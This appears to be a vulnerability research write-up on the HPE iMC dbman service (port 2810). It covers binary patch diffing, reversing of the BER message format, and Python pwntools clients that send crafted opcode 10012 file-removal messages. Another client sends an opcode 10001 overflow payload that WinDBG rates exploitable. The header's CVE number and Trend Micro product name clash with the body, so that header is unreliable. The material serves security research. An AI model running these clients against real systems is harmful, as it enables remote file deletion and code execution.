# CVE-2018-6231 
* Title: Trend Micro Smart Protection Server Auth Command Injection Authentication Bypass Vulnerability 
* CVE-ID: CVE-2017-12561 
* Affected Product: Intelligent Management Center (iMC) 
* Description: The specific flaw exists within dbman service, which listens on TCP port 2810 by default. A crafted opcode 10012 message can cause a pointer to be reused after it has been freed. An attacker can leverage this vulnerability to execute code under the context of SYSTEM. 

---- 
The exact version of the vulnerable software is `iMC_PLAT_7.3_E0504` which there
is a critical patch for it `iMC_PLAT_7.3_E0504P04`. After downloading the whole
package and installing the solution on a Windows 7 SP1 (I didn't have a later
version of Windows or Windows Server to test it as described). 

Following the installation guideline provided by the vendor
[here](https://github.com/pwnslinger/exploit-repo/raw/master/CVE-2017-12561/docs/emr_na-c05367570-2.pdf), I could
successfully configure the Microsoft SQL Server on the Windows 7. By looking at
the binaries installed on the installation path, I could find dbman at
`C:\Progra~1\iMC\dbman\bin` path. 

To make sure the critical patch will affect the `dbman`, I took a backup of the
file to compare the `md5sum` of before/after patch version. 

```
dbman.exe.orig : c0a5cd15339a8eda718886510a347ce8
dbman.exe.patc : 3cd632d4245d08e76014e7240e5f5f82
``` 

## Diffing Process 
Here I used Diaphora for binary patching. In the following, we can see an
initial view of functions changed between these two release. 

![initial view of diaphora bindiff results of dbman.exe](https://github.com/pwnslinger/exploit-repo/raw/master/CVE-2017-12561/pics/initial_view_bindiff.png) 

By taking a look at the functions changed between two release, I couldn't easily
notice the one that was the point of this security vulnerability. However, the
function highlighted in the picture above (`sub_459790`), has a huge switch
case. After taking a brief look at it, I could spot the opcode constant (`0x271c`) in one of the cases: 

![opcode 10012](https://github.com/pwnslinger/exploit-repo/raw/master/CVE-2017-12561/pics/opcode_case.png) 

Given the size of the code in this function, Diaphora couldn't effectively show
the basic blocks and checks added at the first sight. 

![bindiff sub\_459790](https://github.com/pwnslinger/exploit-repo/raw/master/CVE-2017-12561/pics/big_switch_case.png) 

After careful diffing the patched version with the original one, I noticed that
they added checks for freed `SNACC::AsnBuf` object to make sure they Nullify the
reference to that object. 

![nullify freed object reference](https://github.com/pwnslinger/exploit-repo/raw/master/CVE-2017-12561/pics/uaf_check.png)

I started to reverse the packet structure `dbman` expects to receive for the
opcode (`10012`). Based on the decompiled results, it reads 4 bytes of data and allocates a buffer to that size. Then, it receives a buffer to the defined size into a `SNAC::ASNBuf` object. 

```
| opcode | alloc_size | blob |
``` 

Since the application is working with BER (Basic Encoding Rules), by taking a brief look at the `sub_7b0f0`, it turned out that the expected `AsnBuf` should starts with a `SEQUENCE` Tag Type. The following routine, decodes a BER Tag from the received data and checks if the BER Tag ID is `0x30` which is Sequence. Otherwise, the first level BER tag was incorrect. Later on, it decodes the length of the data in the sequence and send it for further processing to `BDecContent`. 

```cpp
void AsnRemoteReservedFileRemove::BERDecode(unsigned int \*decodedLen, SNACC \*SNACC, const struct SNACC::AsnBuf \*buffer) {
  err = " AsnRemoteReservedFileRemove::BDec";
  tagId = SNACC::BDecTag(buffer, decodedLen);
  if ( tagId != 0x30000000 )                    // SEQUENCE
  {
    v3 = (const char *)(*(int (__thiscall **)(unsigned int *))(*bytedDecoded + 8))(bytedDecoded);
    SNACC::InvalidTagException::InvalidTagException(
      (SNACC::InvalidTagException *)&v11,
      v3,
      tagId,
      "..\\..\\..\\asn\\dbman\\plat_dbman_message.cpp",
      2049,
      err);
    CxxThrowException(&v11, &_TI3_AVInvalidTagException_SNACC__, v5, v6, v7, v8, v9);
  }
  len = SNACC::BDecLen(buffer, bytedDecoded);
  BERDecodeSeq(v4, SNACC, 0x30000000, len, buffer);
}

``` 

BDecContent function will parse the SEQUENCE for three Octet Strings and one
last Integer value. 

```cpp
void AsnRemoteReservedFileRemove::BDecContent(SNACC \*SNACC_1, int tagId, int len, const struct SNACC::AsnBuf \*buffer) { 

  int bytesDecoded = 0;
  const char \*err = " AsnRemoteReservedFileRemove::BDecContent";
  int encBuf = 0;
  unsigned int elmtLen = 0;
  tagID = SNACC::BDecTag((const struct SNACC::AsnBuf) * &encBuf, bytesDecoded);
  if ( tagID != 0x4000000 && tagID != 0x24000000 ) // 
  {
    SNACC::SnaccException::SnaccException(
      "..\\..\\..\\asn\\dbman\\plat_dbman_message.cpp",
      1981,
      err,
      "SEQUENCE is missing non-optional root elmt",
      6005);
    CxxThrowException(&v43, &_TI2_AVSnaccException_SNACC__, v9, v14, v19, v24, v29);
  }
  elmtLen = SNACC::BDecLen(SNACC_1, (const struct SNACC::AsnBuf \*)&encBuf, octBytesDecoded_1);
  SNACC::AsnOcts::BDecContent((SNACC::AsnOcts \*)(v6 + 2), SNACC_1, tagID, elmtLen, (unsigned int \*)&encBuf);
  tagID = SNACC::BDecTag(SNACC_1, (const struct SNACC::AsnBuf \*)&encBuf, v6);
  if ( tagID != 0x4000000 && tagID != 0x24000000 )
  {
    SNACC::SnaccException::SnaccException(
      (SNACC::SnaccException *)&v42,
      "..\\..\\..\\asn\\dbman\\plat_dbman_message.cpp",
      1993,
      err,
      "SEQUENCE is missing non-optional root elmt",
      6005);
    CxxThrowException(&v42, &_TI2_AVSnaccException_SNACC__, v10, v15, v20, v25, v30);
  }
  elmtLen = SNACC::BDecLen(SNACC_1, (const struct SNACC::AsnBuf \*)&encBuf, octBytesDecoded_2);
  SNACC::AsnOcts::BDecContent((SNACC::AsnOcts \*)(v7 + 12), SNACC_1, tagID, elmtLen, (unsigned int \*)&encBuf);
  tagID = SNACC::BDecTag(SNACC_1, (const struct SNACC::AsnBuf \*)&encBuf, v7);
  if ( tagID != 0x4000000 && tagID != 0x24000000 )
  {
    SNACC::SnaccException::SnaccException(
      (SNACC::SnaccException *)&v41,
      "..\\..\\..\\asn\\dbman\\plat_dbman_message.cpp",
      2005,
      err,
      "SEQUENCE is missing non-optional root elmt",
      6005);
    CxxThrowException(&v41, &_TI2_AVSnaccException_SNACC__, v11, v16, v21, v26, v31);
  }
  elmtLen = SNACC::BDecLen(SNACC_1, (const struct SNACC::AsnBuf \*)&encBuf, octBytesDecoded_3);
  SNACC::AsnOcts::BDecContent((SNACC::AsnOcts \*)(v8 + 22), SNACC_1, tagID, elmtLen, (unsigned int \*)&encBuf);
  tagID = SNACC::BDecTag(SNACC_1, (const struct SNACC::AsnBuf \*)&encBuf, v8);
  if ( tagID != 0x2000000 )
  {
    SNACC::SnaccException::SnaccException(
      (SNACC::SnaccException *)&v40,
      "..\\..\\..\\asn\\dbman\\plat_dbman_message.cpp",
      2015,
      err,
      "SEQUENCE is missing non-optional root elmt",
      6005);
    CxxThrowException(&v40, &_TI2_AVSnaccException_SNACC__, v12, v17, v22, v27, v32);
  }
  elmtLen = SNACC::BDecLen(SNACC_1, (const struct SNACC::AsnBuf \*)&encBuf, intBytesDecoded);
  SNACC::AsnInt::BDecContent(
    (SNACC::AsnInt *)(octBytesDecoded_1d + 32),
    SNACC_1,
    0x2000000u,
    elmtLen,
    (unsigned int *)&encBuf);
    \*(_DWORD \*)buffer += encBuf;
  if ( len == -1 )
  {
    SNACC::BDecEoc(SNACC_1, buffer, octBytesDecoded_1d);
  }
  else if ( encBuf != len )
  {
    SNACC::SnaccException::SnaccException(
      (SNACC::SnaccException *)&SNACC,
      "..\\..\\..\\asn\\dbman\\plat_dbman_message.cpp",
      2026,
      err,
      "Length discrepancy on sequence",
      6005);
    CxxThrowException(&SNACC, &_TI2_AVSnaccException_SNACC__, v13, v18, v23, v28, v33);
  }
}
``` 

Meanwhile, I took a look at the existence of any client who might generate logs
by communicating with dbman.exe process. There is a file located at `C:\Program
Files\iMC\dbman\log\dbman_debug.log` which contains the valuable information
related to the received packets and `pprint` of their structure. 

```
2020-05-10 11:46:33 [INFO] [Main] Version: 7.3
2020-05-10 11:46:33 [INFO] [Main] Global directory: C:/Program Files/iMC/dbman
2020-05-10 11:46:33 [INFO] [Main] Listenning on port: 2810
2020-05-10 11:46:33 [DEBUG] [Main] arv count 1
2020-05-10 11:46:33 [DEBUG] [Main] arv 1: C:\Program Files\iMC\dbman\bin\dbman.exe
2020-05-10 11:46:33 [INFO] [Client::connect_to_server] Starting connect to 127.0.0.1: 2810
2020-05-10 11:46:34 [DEBUG] [Client::connect_to_server] errno: 10061, strerror: connection refused
2020-05-10 11:46:34 [ERROR] [Client::connect_to_server] Connection failed
2020-05-10 11:46:34 [ERROR] [Client::send_echo_msg] Connect to server fail
2020-05-10 11:46:34 [DEBUG] [CreateCommandThread] Succeed to create command process thread .
2020-05-10 11:46:34 [DEBUG] [CommandMain] Start CommandMain()
2020-05-10 11:46:36 [INFO] [DBMAN] Startup successfully!
2020-05-10 11:46:36 [DEBUG] [NormalRun] Begin excute NormalRun
2020-05-10 11:46:36 [INFO] [NormalRun] MaxLogSize = 10485760
2020-05-10 11:46:36 [INFO] [NormalRun] ServerCount = -1
2020-05-10 11:46:36 [INFO] [NormalRun] Local ip address: 127.0.0.1
2020-05-10 11:46:36 [INFO] [NormalRun] Local ip address: 192.168.156.140
2020-05-10 11:46:36 [INFO] [NormalRun] Local ip address: 127.0.0.1
2020-05-10 11:46:36 [INFO] [NormalRun] Local ip address: fe80::a9ce:a25:1c78:76c5%11
``` 

I tried to create a simple client to communicate with server on port `2810` via
`0x271c` opcode: 

```python
from pwn import *

if __name__ == '__main__':
    HOST = '192.168.156.140'
    PORT = 2810 # default port
    p = make_packer(32, endian='big', sign='unsigned')
    conn = remote(HOST, PORT)

    # create the payload here
    # | opcode | alloc_size | blob |
    payload = b''
    payload += p(0x271c) # opcode
    payload += p(0x100)
    payload += p(0x41*0x100)

    conn.sendline(payload)
``` 

Here is the result of sending the above packet to `dbman` process in the `dbman_debug.log` file. 

```
2020-05-10 12:15:30 [DEBUG] [My_Accept_Handler::handle_input] Connection established 192.168.156.1
2020-05-10 12:15:30 [DEBUG] [CDataConnStreamQueueT::deal_msg] Receive command code: 10012
2020-05-10 12:15:30 [ERROR] [response_err_code] errCode = -1
2020-05-10 12:15:30 [ERROR] [CDataConnStreamQueueT::deal_msg] Receive AsnDbmanCmdCode::iMSG_V001_REMOVE_RESERVED_FILE_REQ data_len error expect 256 bytes infact 5 bytes
``` 

To get a better understanding of the program, I decided to look for the
existence of any client created to communicate with `dbman.exe`. I found a `deploy.jar` program in deploy directory of the iMC. After decompiling the JAR file using JD-GUI and opening the solution in Eclipse, my eyes stumbled upon the `com.h3c.imc.asn1msg.platdbmanmessage` package. By taking a closer look at the disassembly and matching it with classes in the package, I found `AsnRemoteReservedFileRemove` class. This name was the same one as I saw in the exception handling of one of the routines in the disassembly. 

```Java
public class AsnRemoteReservedFileRemove implements ASN1Type
{
   public byte[] reservedFilePath;
   public byte[] backupPath;
   public byte[] backFileExt;
   public BigInteger time;
   
   public AsnRemoteReservedFileRemove() {}
   
   public AsnRemoteReservedFileRemove(AsnRemoteReservedFileRemove paramAsnRemoteReservedFileRemove) {
     this.reservedFilePath = new byte[paramAsnRemoteReservedFileRemove.reservedFilePath.length];
     System.arraycopy(paramAsnRemoteReservedFileRemove.reservedFilePath, 0, this.reservedFilePath, 0, paramAsnRemoteReservedFileRemove.reservedFilePath.length);
     this.backupPath = new byte[paramAsnRemoteReservedFileRemove.backupPath.length];
     System.arraycopy(paramAsnRemoteReservedFileRemove.backupPath, 0, this.backupPath, 0, paramAsnRemoteReservedFileRemove.backupPath.length);
     this.backFileExt = new byte[paramAsnRemoteReservedFileRemove.backFileExt.length];
     System.arraycopy(paramAsnRemoteReservedFileRemove.backFileExt, 0, this.backFileExt, 0, paramAsnRemoteReservedFileRemove.backFileExt.length);
     this.time = paramAsnRemoteReservedFileRemove.time;
   }

   
   public void encode(ASN1Encoder paramASN1Encoder) throws ASN1Exception {
     int i = paramASN1Encoder.encodeSequence();
     paramASN1Encoder.encodeOctetString(this.reservedFilePath);
     paramASN1Encoder.encodeOctetString(this.backupPath);
     paramASN1Encoder.encodeOctetString(this.backFileExt);
     paramASN1Encoder.encodeInteger(this.time);
     paramASN1Encoder.endOf(i);
}
``` 

This piece of valuable information almost completed the puzzle and ambiguity of
the following function. 

```cpp
SNACC::AsnType AsnRemoteReservedFileRemoveInit()
{
  SNACC::AsnType *AsnRemoteReservedFileRemove;
  AsnRemoteReservedFileRemove = this;
  SNACC::AsnType::AsnType(this);
  *(DWORD *)AsnRemoteReservedFileRemove = &SNACC::AsnRemoteReservedFileRemove::vftable;
  SNACC::AsnOcts::AsnOcts((SNACC::AsnType *)((char *)AsnRemoteReservedFileRemove + 8));// reservedFilePath
  SNACC::AsnOcts::AsnOcts((SNACC::AsnType *)((char *)AsnRemoteReservedFileRemove + 48));// backupPath
  SNACC::AsnOcts::AsnOcts((SNACC::AsnType *)((char *)AsnRemoteReservedFileRemove + 88));// backFileExt
  SNACC::AsnInt::AsnInt((SNACC::AsnType *)((char *)AsnRemoteReservedFileRemove + 128), 0);// time
  EndOfContentTag();
  return AsnRemoteReservedFileRemove;
}
``` 

So, we are dealing with removing a file from server by sending this message.
Then I started to modify the initial client to send the messages following the
defined structure. 

```python
from pyasn1.type.namedtype import NamedType, NamedTypes
from pyasn1.type.univ import Sequence, OctetString, Integer, Null
from pwn import *
from pyasn1.codec.ber import encoder
import time

class AsnRemoteReservedFileRemove(object):
    def __init__(self, reservedFilePath, backupPath, backFileExt, time):
        super(AsnRemoteReservedFileRemove, self).__init__()
        self.reservedFilePath = reservedFilePath
        self.backupPath = backupPath
        self.backFileExt = backFileExt
        self.time = time

    def encode(self):
        self.s = Sequence()
        self.s.setComponentByPosition(0, OctetString(self.reservedFilePath))
        self.s.setComponentByPosition(1, OctetString(self.backupPath))
        self.s.setComponentByPosition(2, OctetString(self.backFileExt))
        self.s.setComponentByPosition(3, Integer(self.time))
        self.s.setComponentByPosition(4, Null())
        return encoder.encode(self.s)

if __name__ == '__main__':
    HOST = '192.168.156.142'
    PORT = 2810 # default port
    p = make_packer(32, endian='big', sign='unsigned')
    conn = remote(HOST, PORT)

    # create the payload here
    # | opcode | alloc_size | blob |
    payload = b''
    payload += p(0x271c) # opcode

    obj = AsnRemoteReservedFileRemove('C:\\Progra~1\\iMC\\dbman\\log\\dbman_debug_1.log',
                                      'C:\\Users\\Mohsen\dbman_debug.log',
                                      '.log', time.time())
    AsnEnc = obj.encode()

    payload += p(len(AsnEnc))
    payload += AsnEnc

    conn.sendline(payload)
``` 

Interestingly, by playing a little bit with other APIs, I could cause a remote
Buffer Overflow by sending opcode `10001`: 

```python
from pyasn1.type.namedtype import NamedType, NamedTypes
from pyasn1.type.univ import Sequence, OctetString, Integer, Null
from pwn import *
from pyasn1.codec.ber import encoder
import time

class AsnDbmanMkdirReq(object):
    def __init__(self, path):
        super(AsnDbmanMkdirReq, self).__init__()
        self.reservedFilePath = path

    def encode(self):
        self.s = Sequence()
        self.s.setComponentByPosition(0, OctetString(self.path))
        self.s.setComponentByPosition(1, Null())
        return encoder.encode(self.s)

class AsnPlatRemoteDiskDirReqContent(object):
    def __init__(self, flag, curDir):
        super(AsnPlatRemoteDiskDirReqContent, self).__init__()
        self.flag = flag
        self.curDir = curDir

    def encode(self):
        self.s = Sequence()
        self.s.setComponentByPosition(0, Integer(self.flag))
        self.s.setComponentByPosition(1, OctetString(self.curDir))
        self.s.setComponentByPosition(2, Null())
        return encoder.encode(self.s)

class AsnRemoteReservedFileRemove(object):
    def __init__(self, reservedFilePath, backupPath, backFileExt, time):
        super(AsnRemoteReservedFileRemove, self).__init__()
        self.reservedFilePath = reservedFilePath
        self.backupPath = backupPath
        self.backFileExt = backFileExt
        self.time = time

    def encode(self):
        self.s = Sequence()
        self.s.setComponentByPosition(0, OctetString(self.reservedFilePath))
        self.s.setComponentByPosition(1, OctetString(self.backupPath))
        self.s.setComponentByPosition(2, OctetString(self.backFileExt))
        self.s.setComponentByPosition(3, Integer(self.time))
        self.s.setComponentByPosition(4, Null())
        return encoder.encode(self.s)


if __name__ == '__main__':
    HOST = '192.168.156.142'
    PORT = 2810 # default port
    p = make_packer(32, endian='big', sign='unsigned')
    conn = remote(HOST, PORT)

    # create the payload here
    # | opcode | alloc_size | blob |
    payload = b''
    payload += p(10001) # opcode

    obj = AsnPlatRemoteDiskDirReqContent(1, '\x41'*2700)
    AsnEnc = obj.encode()

    payload += p(len(AsnEnc))
    payload += AsnEnc

    conn.sendline(payload)

``` 

In the WinDBG attached debugger we can see the epxloitabiliy of the crash by
running the !exploitable: 

```
0:001:x86> !exploitable

!exploitable 1.6.0.0
Exploitability Classification: EXPLOITABLE
Recommended Bug Title: Exploitable - Exception Handler Chain Corrupted starting at KERNEL32!GetProfileStringW+0x0000000000012cc1 (Hash=0x21ea8d77.0x36f31b11)

Corruption of the exception handler chain is considered exploitable
``` 

And here is the `dbman.exe` log file report: 

```
2020-05-11 02:38:54 [DEBUG] [My_Accept_Handler::handle_input] Connection established 192.168.156.1
2020-05-11 02:38:54 [DEBUG] [CDataConnStreamQueueT::deal_msg] Receive command code: 10001
2020-05-11 02:39:17 [INFO] [getDirContent] File info oDirReq:{ -- SEQUENCE --
    flag '01'H  -- 
,
    curDir '414141414..41
``` 
